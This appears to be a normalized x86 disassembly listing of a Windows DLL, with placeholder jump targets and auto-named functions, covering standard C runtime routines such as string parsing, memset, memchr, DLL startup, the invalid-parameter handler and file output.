jmp r-xdata
xor eax eax
xor edx edx
mov [ eax ] ebx
cmp eax 0x24
jg r-xdata
mov eax [ ebp + 0x10 ]
cmp eax esi
jl r-xdata
cmp eax esi
mov cl 0x30
jle r-xdata
cmp [ edi ] cl
je r-xdata
cmp eax 0x10
jne r-xdata
mov al [ edi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
mov [ ebp - 0xc ] edi
jmp r-xdata
cmp [ edi ] cl
jne r-xdata
mov [ ebp + 0x10 ] 0x10
cmp al 0x58
je r-xdata
cmp [ edi ] cl
je r-xdata
mov al [ edi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0x8
jmp r-xdata
inc edi
movsx eax [ edi ]
push [ ebp + 0x10 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2 ] 0x0
call sub_1002b1c5
pop ecx
push eax
mov esi r--data
push esi
call sub_10024c40
mov ecx eax
add esp 0xc
test ecx ecx
je r-xdata
inc edi
inc edi
cmp al 0x58
jne r-xdata
cmp [ ebp - 0xc ] edi
jne r-xdata
mov eax [ ebp + 0x10 ]
cdq
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov ebx [ ebp + 0x10 ]
movsx ecx [ ebx + r--data ]
mov eax edi
sub eax ecx
sub eax [ ebp - 0x10 ]
js r-xdata
mov eax [ ebp + 0xc ]
test eax eax
jmp r-xdata
push [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
push [ ebp - 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
push [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
push [ ebp - 0x28 ]
mov bl cl
mov eax esi
sub bl al
mov [ ebp - 0x2 ] bl
call sub_1002b270
push [ ebp + 0x10 ]
mov ecx eax
mov eax edx
mov [ ebp - 0x8 ] eax
movsx eax bl
cdq
add ecx eax
mov eax [ ebp - 0x8 ]
adc eax edx
mov [ ebp - 0x14 ] eax
inc edi
movsx eax [ edi ]
push eax
mov [ ebp - 0x18 ] ecx
call sub_1002b1c5
pop ecx
push eax
push esi
call sub_10024c40
mov ecx eax
add esp 0xc
test ecx ecx
jne r-xdata
mov ebx [ ebp + 0x8 ]
cmp [ ebp - 0x1 ] 0x2d
jne r-xdata
test eax eax
jg r-xdata
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x14 ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
call sub_1002972b
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
movsx eax [ ebp - 0x2 ]
mov esi [ ebp - 0x18 ]
mov ecx [ ebp - 0x14 ]
cdq
sub esi eax
sbb ecx edx
cmp [ ebp - 0x14 ] ecx
jb r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
jmp r-xdata
mov [ eax ] edi
or [ ebp - 0x18 ] 0xffffffff
or [ ebp - 0x14 ] 0xffffffff
mov [ ebp - 0x1 ] 0x2b
mov [ eax ] 0x1
ja r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax ebx
cdq
push edx
push eax
push ecx
push esi
call sub_1002b200
cmp eax [ ebp - 0x20 ]
jne r-xdata
cmp [ ebp - 0x18 ] esi
jb r-xdata
cmp edx [ ebp - 0x1c ]
je r-xdata
sub_10023fe1
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10024003
fstp [ ebp - 0x4 ]
fld [ ebp - 0x4 ]
add esp 0x10
leave
retn
sub_10024003
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
call sub_1002972b
mov esi [ eax ]
call sub_1002972b
push [ ebp + 0xc ]
and [ eax ] 0x0
push [ ebp + 0x8 ]
call sub_1002b446
fstp [ ebp - 0x8 ]
pop ecx
pop ecx
call sub_1002972b
mov eax [ eax ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
call sub_1002972b
fld [ r--data ]
mov [ eax ] esi
mov eax [ ebp + 0x10 ]
pop esi
jmp r-xdata
test eax eax
jg r-xdata
fld [ ebp - 0x8 ]
dec eax
fmul st1
fstp [ ebp - 0x8 ]
jge r-xdata
fstp st0
fld [ ebp - 0x8 ]
leave
retn
neg eax
dec eax
fld [ ebp - 0x8 ]
fdiv st1
fstp [ ebp - 0x8 ]
jne r-xdata
sub_10024082
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x4 ]
call sub_10029ba7
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
call sub_10029b5b
jmp r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x19
ja r-xdata
cmp [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] eax
jne r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
pop esi
leave
retn
sub eax 0x20
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
mov eax [ ebp - 0x8 ]
and eax 0xff
movsx eax [ ecx + eax * 2 ]
shr eax 0xf
and eax 0x1
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
call sub_10029fd7
movzx ecx [ ebp - 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
mov eax [ esi + 0x8 ]
test [ eax + ebx * 2 ] 0x2
je r-xdata
push ebx
call sub_1002787f
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov [ ebp + 0xc ] bl
mov [ ebp + 0xd ] 0x0
inc eax
mov al [ ebp - 0x8 ]
push 0x2
mov [ ebp + 0xc ] al
mov [ ebp + 0xd ] bl
mov [ ebp + 0xe ] 0x0
pop eax
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
jmp r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x4 ]
je r-xdata
push 0x1
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0xc ]
push eax
push 0x200
push [ ebp - 0xc ]
push 0x0
call sub_10029f92
add esp 0x24
test eax eax
jne r-xdata
pop ebx
movzx ecx [ ebp - 0x3 ]
shl eax 0x8
or eax ecx
sub_10024194
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push ebx
push esi
push edi
mov ebx edx
mov edi edx
and ebx 0x4
and edi 0x80
test dl 0x40
je r-xdata
test dl 0x8
je r-xdata
or edx 0x1
xor ecx ecx
and edx 0xffffff3b
xor eax eax
inc ecx
or edx 0x2
mov esi eax
shl esi 0x2
cmp [ esi + r--data ] 0x0
jne r-xdata
mov ecx [ eax * 4 + r--data ]
inc eax
test ecx ecx
jne r-xdata
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
cmp ecx edx
je r-xdata
push [ ebp + 0x10 ]
mov esi [ esi + rw-data ]
push esi
push [ ebp + 0x8 ]
call sub_1002b45d
mov esi eax
add esp 0xc
test esi esi
je r-xdata
test dl 0x1
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test ebx ebx
je r-xdata
push [ ebp + 0x10 ]
push r--data
push [ ebp + 0x8 ]
call sub_1002b45d
add esp 0xc
test eax eax
je r-xdata
mov eax esi
push 0x2
push 0x0
push esi
call sub_10025322
add esp 0xc
test eax eax
je r-xdata
push eax
push esi
jmp r-xdata
call sub_100257b5
pop ecx
jmp r-xdata
sub_1002428c
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
dec eax
mov [ rw-data ] eax
mov [ eax * 4 + rw-data ] ecx
pop ebp
retn
pop ebp
jmp sub_1002844b
sub_100242f1
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
call sub_1002972b
push 0x16
pop esi
mov [ eax ] esi
pop edi
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
call sub_10024b80
add esp 0xc
cmp [ ebp + 0x10 ] edi
je r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_10026f10
add esp 0xc
jmp r-xdata
push 0x16
pop eax
call sub_1002972b
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_1002480c
add esp 0x14
mov eax esi
jmp r-xdata
sub_10024389
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
jmp r-xdata
push [ ebp + 0x8 ]
call sub_100272fd
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_1002b638
pop ecx
test eax eax
je r-xdata
leave
retn
test [ rw-data ] 0x1
mov esi rw-data
jne r-xdata
push esi
lea ecx [ ebp - 0xc ]
call sub_10001d8e
push r--data
lea eax [ ebp - 0xc ]
push eax
call sub_10027dd1
int3
or [ rw-data ] 0x1
mov ecx esi
call sub_1002436e
push sub_1004fd81
call sub_10028434
pop ecx
sub_100243ff
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi ecx
mov [ edi ] r--data
mov eax [ ebx ]
test eax eax
je r-xdata
and [ edi + 0x4 ] 0x0
push eax
call sub_10024630
mov esi eax
inc esi
push esi
call sub_100272fd
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
mov [ edi + 0x8 ] 0x1
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
push [ ebx ]
push esi
push eax
call sub_1002b660
add esp 0xc
jmp r-xdata
sub_1002446f
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] r--data
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
test eax eax
mov eax [ ebx + 0x4 ]
push edi
je r-xdata
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
and [ esi + 0x4 ] 0x0
jmp r-xdata
push eax
call sub_10024630
mov edi eax
inc edi
push edi
call sub_100272fd
pop ecx
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
push [ ebx + 0x4 ]
push edi
push eax
call sub_1002b660
add esp 0xc
jmp r-xdata
sub_100244ef
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_100243ff
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10024535
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_100244cc
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_10024556
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100244cc
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_1002458d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1002457d
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_100245ae
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_100276a0
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_100245ce
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push esi
push edi
xor edi edi
cmp eax edi
je r-xdata
xor eax eax
cmp [ ebp + 0x8 ] edi
jne r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
call sub_1002972b
push 0x16
pop esi
mov [ eax ] esi
cmp [ ebp + 0xc ] eax
jae r-xdata
pop edi
pop esi
pop ebp
retn
push eax
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_1002b740
add esp 0xc
call sub_1002972b
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_1002480c
add esp 0x14
mov eax esi
jmp r-xdata
sub_10024630
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_100246bb
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
inc eax
inc eax
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_100246e4
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x328 ] 0x0
push ebx
push 0x4c
lea eax [ ebp - 0x324 ]
push 0x0
push eax
call sub_10024b80
lea eax [ ebp - 0x328 ]
mov [ ebp - 0x2d8 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x2d4 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x20c ] ecx
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov [ ebp - 0x328 ] 0xc0000417
mov [ ebp - 0x324 ] 0x1
mov [ ebp - 0x31c ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov ebx eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x2d8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push 0xc0000417
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_100242d7
leave
retn
test ebx ebx
jne r-xdata
push 0x2
call sub_1002baa5
pop ecx
sub_1002480c
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call sub_1002bb28
pop ecx
test eax eax
je r-xdata
push 0x2
call sub_1002baa5
pop ecx
pop ebp
jmp sub_100246e4
pop ebp
jmp eax
sub_10024842
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push edi
cmp eax 0x1
jne r-xdata
xor edi edi
cmp eax edi
jne r-xdata
push eax
call sub_1002c811
pop ecx
test eax eax
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ rw-data ] edi
jle r-xdata
call sub_1002bf2c
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp eax 0x3
jne r-xdata
call sub_1002bba3
push 0x214
push 0x1
call sub_1002a045
mov esi eax
pop ecx
pop ecx
cmp esi edi
je r-xdata
dec [ rw-data ]
cmp [ rw-data ] edi
jne r-xdata
call sub_1002c7c5
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_1002c68e
mov [ rw-data ] eax
call sub_1002c0b9
test eax eax
jge r-xdata
call sub_1002c841
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0xc
xor eax eax
inc eax
push edi
call sub_1002bebd
pop ecx
push esi
push [ rw-data ]
push [ rw-data ]
call sub_1002bb28
pop ecx
call eax
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] edi
jne r-xdata
call sub_10027d74
call sub_1002c5d3
test eax eax
jl r-xdata
call sub_1002bbd7
jmp r-xdata
push esi
call sub_10024aba
pop ecx
jmp r-xdata
push edi
push esi
call sub_1002bc14
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
call sub_1002c30d
call sub_1002bbd7
call sub_1002c841
jmp r-xdata
call sub_1002c30d
jmp r-xdata
call sub_1002c35b
test eax eax
jl r-xdata
push 0x0
call sub_10027b97
pop ecx
test eax eax
jne r-xdata
inc [ rw-data ]
jmp r-xdata
sub_10024977
push 0xc
push r--data
call sub_1002ca38
mov edi ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
xor eax eax
inc eax
mov [ ebp - 0x1c ] eax
test esi esi
jne r-xdata
and [ ebp - 0x4 ] 0x0
cmp esi eax
je r-xdata
cmp [ rw-data ] edx
je r-xdata
mov eax [ r--data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
xor eax eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
push edi
push esi
push ebx
call sub_10001000
mov [ ebp - 0x1c ] eax
cmp esi 0x1
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
push edi
push esi
push ebx
call sub_10024842
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
push edi
push esi
push ebx
call sub_10024842
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
push edi
push eax
push ebx
call sub_10001000
push edi
push 0x0
push ebx
call sub_10024842
mov eax [ r--data ]
test eax eax
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
and [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push edi
push 0x0
push ebx
call eax
mov eax [ r--data ]
test eax eax
je r-xdata
call sub_1002ca7d
retn
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
_start
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_10024977
pop ecx
pop ebp
retn 0xc
call sub_1002cc2c
sub_10024a90
push [ rw-data ]
call sub_1002bb28
pop ecx
test eax eax
je r-xdata
push 0x19
call sub_1002ccc2
push 0x1
push 0x0
call sub_10028562
add esp 0xc
jmp sub_1002844b
call eax
sub_10024aba
push 0xc
push r--data
call sub_1002ca38
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_1002ca7d
retn
cmp [ rw-data ] 0x3
jne r-xdata
push esi
push 0x4
call sub_1002d1b0
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_1002d1e3
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
call sub_1002972b
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_100296e9
mov [ esi ] eax
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10024b10
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
push esi
push eax
call sub_1002d213
pop ecx
pop ecx
push [ ebp + 0x8 ]
jmp r-xdata
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
sub_10024b80
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x100
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_1002dcfe
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_10024bfa
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1002ecba
add esp 0x14
pop ebp
retn
sub_10024c40
mov eax [ esp + 0xc ]
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov edx [ esp + 0x8 ]
xor ebx ebx
mov bl [ esp + 0xc ]
test edx 0x3
je r-xdata
sub eax 0x4
jb r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
add eax 0x4
je r-xdata
push edi
mov edi ebx
shl ebx 0x8
add ebx edi
mov edi ebx
shl ebx 0x10
add ebx edi
jmp r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
sub eax 0x1
je r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
mov ecx [ edx ]
xor ecx ebx
mov edi 0x7efefeff
add edi ecx
xor ecx 0xffffffff
xor ecx edi
add edx 0x4
and ecx 0x81010100
je r-xdata
test edx 0x3
jne r-xdata
sub eax 0x1
jne r-xdata
sub eax 0x4
jb r-xdata
mov ecx [ edx - 0x4 ]
xor cl bl
je r-xdata
pop edi
lea eax [ edx - 0x4 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
lea eax [ edx - 0x3 ]
pop edi
pop ebx
retn
shr ecx 0x10
xor cl bl
je r-xdata
lea eax [ edx - 0x2 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
pop edi
jmp r-xdata
sub_10024cf0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_10024d41
push 0xc
push r--data
call sub_1002ca38
xor edi edi
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0xc ]
cmp esi edi
setne al
cmp eax edi
jne r-xdata
push esi
call sub_1002749e
pop ecx
mov [ ebp - 0x4 ] edi
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_1002972b
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_1002480c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
call sub_1002ed42
pop ecx
cmp eax 0xffffffff
je r-xdata
call sub_1002ca7d
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10024e45
mov eax [ ebp - 0x1c ]
dec [ esi + 0x4 ]
js r-xdata
mov ecx rw-data
cmp eax 0xfffffffe
je r-xdata
push esi
push [ ebp + 0x8 ]
call sub_1002de4c
pop ecx
pop ecx
mov ecx [ esi ]
mov al [ ebp + 0x8 ]
mov [ ecx ] al
movzx eax al
inc [ esi ]
jmp r-xdata
call sub_1002972b
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_1002480c
add esp 0x14
or [ ebp - 0x1c ] 0xffffffff
cmp eax 0xffffffff
je r-xdata
mov edx eax
sar edx 0x5
mov ecx eax
and ecx 0x1f
shl ecx 0x6
add ecx [ edx * 4 + rw-data ]
jmp r-xdata
mov [ ebp - 0x1c ] eax
mov eax rw-data
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
sub_10024e4d
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0xc ] edi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] edi
je r-xdata
mov esi [ ebp + 0x14 ]
cmp esi edi
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx edi
je r-xdata
call sub_1002972b
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
or eax 0xffffffff
xor edx edx
div [ ebp + 0xc ]
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov edi [ ebp + 0xc ]
imul edi [ ebp + 0x10 ]
test [ esi + 0xc ] 0x10c
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edi
mov ebx edi
je r-xdata
mov [ ebp - 0x8 ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
jmp r-xdata
mov ecx [ esi + 0xc ]
and ecx 0x108
je r-xdata
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax ]
push esi
push eax
call sub_1002de4c
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
test ecx ecx
je r-xdata
jl r-xdata
mov eax edi
inc [ ebp - 0x4 ]
mov eax [ esi + 0x18 ]
dec ebx
mov [ ebp - 0x8 ] eax
test eax eax
jg r-xdata
cmp [ ebp - 0x8 ] 0x0
mov edi ebx
je r-xdata
push esi
call sub_10025558
pop ecx
test eax eax
jne r-xdata
or [ esi + 0xc ] 0x20
mov edi ebx
cmp ebx eax
jb r-xdata
test ebx ebx
jne r-xdata
mov [ ebp - 0x8 ] 0x1
push edi
push [ ebp - 0x4 ]
push esi
call sub_1002ed42
pop ecx
push eax
call sub_1002f4a7
add esp 0xc
cmp eax 0xffffffff
je r-xdata
xor edx edx
mov eax ebx
div [ ebp - 0x8 ]
sub edi edx
push edi
push [ ebp - 0x4 ]
push [ esi ]
call sub_10026f10
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
sub ebx edi
add [ ebp - 0x4 ] edi
jmp r-xdata
mov edi eax
or [ esi + 0xc ] 0x20
mov eax [ ebp - 0xc ]
jmp r-xdata
mov ecx edi
cmp eax edi
ja r-xdata
mov edi [ ebp - 0xc ]
jmp r-xdata
sub eax ebx
xor edx edx
div [ ebp + 0xc ]
jmp r-xdata
add [ ebp - 0x4 ] ecx
sub ebx ecx
cmp eax edi
jb r-xdata
mov ecx eax
sub_10024faf
push 0xc
push r--data
call sub_1002ca38
xor esi esi
cmp [ ebp + 0xc ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] esi
setne al
cmp eax esi
jne r-xdata
push [ ebp + 0x14 ]
call sub_1002749e
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10024e4d
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10025027
mov eax [ ebp - 0x1c ]
jmp r-xdata
call sub_1002972b
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_1002480c
add esp 0x14
call sub_1002ca7d
retn
sub_10025031
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x40
push edi
jne r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffff
je r-xdata
push esi
call sub_1002ed42
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
mov eax [ esi + 0xc ]
test al 0x1
jne r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
xor edi edi
cmp [ esi + 0x8 ] edi
jne r-xdata
test al al
jns r-xdata
call sub_1002972b
xor edi edi
push edi
push edi
push edi
